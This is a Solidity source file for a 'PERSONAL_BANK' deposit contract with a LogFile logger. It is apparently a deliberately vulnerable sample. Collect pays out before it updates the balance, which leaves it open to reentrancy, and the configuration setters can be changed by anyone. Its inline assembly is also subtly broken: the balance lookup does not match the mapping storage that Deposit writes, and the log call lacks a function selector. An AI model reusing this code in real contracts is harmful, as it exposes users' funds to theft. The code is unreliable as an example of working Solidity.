pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) private balances;   
    uint private MinSum = 1 ether;
    LogFile private Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    bool private intitalized;

    function SetMinSum(uint _val) public {
        assembly {
            if sload(intitalized_slot) { revert(0, 0) }
            sstore(MinSum_slot, _val)
        }
    }
    
    function SetLogFile(address _log) public {
        assembly {
            if sload(intitalized_slot) { revert(0, 0) }
            sstore(Log_slot, _log)
        }
    }
    
    function Initialized() public {
        assembly { sstore(intitalized_slot, 1) }
    }
    
    function Deposit() public payable {
        balances[msg.sender] += msg.value;
        Log.AddMessage(msg.sender, msg.value, "Put");
    }
    
    function Collect(uint _am) public payable {
        assembly {
            let sender := caller
            let minSum := sload(MinSum_slot)
            let balance := sload(add(balances_slot, sender))
            if and(ge(balance, minSum), ge(balance, _am)) {
                if call(gas, sender, _am, 0, 0, 0, 0) {
                    sstore(add(balances_slot, sender), sub(balance, _am))
                    mstore(0x80, caller)
                    mstore(0xa0, _am)
                    mstore(0xc0, "Collect")
                    let log := sload(Log_slot)
                    call(gas, log, 0, 0x80, 0x60, 0, 0)
                }
            }
        }
    }
    
    function() public payable {
        Deposit();
    }
}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] private History;
    Message private LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}